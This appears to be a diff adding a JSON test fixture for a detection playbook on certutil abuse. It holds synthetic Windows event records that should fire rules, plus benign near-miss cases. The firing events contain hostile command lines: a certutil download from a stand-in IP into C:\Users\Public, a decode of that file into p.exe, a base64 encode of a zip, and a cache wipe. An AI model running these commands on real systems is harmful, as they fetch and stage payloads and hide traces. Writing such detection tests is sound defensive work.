@@ -1,0 +1,91 @@
+{
+ "playbook": "signal_certutil_abuse",
+ "fires": [
+  {
+   "rule": "CertUtil Download",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.7/p.txt C:\\Users\\Public\\p.txt",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "CertUtil Decode Operation",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil -decode C:\\Users\\Public\\p.txt C:\\Users\\Public\\p.exe",
+      "User": "CORP\\alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "CertUtil Encode Operation",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil -encode C:\\temp\\data.zip C:\\temp\\data.b64",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "CertUtil Cache Clear",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil -urlcache * delete",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ],
+ "near_miss": [
+  {
+   "name": "hash a file",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil -hashfile C:\\tools\\setup.exe SHA256",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "name": "list the certificate store",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil -store my",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ]
+}
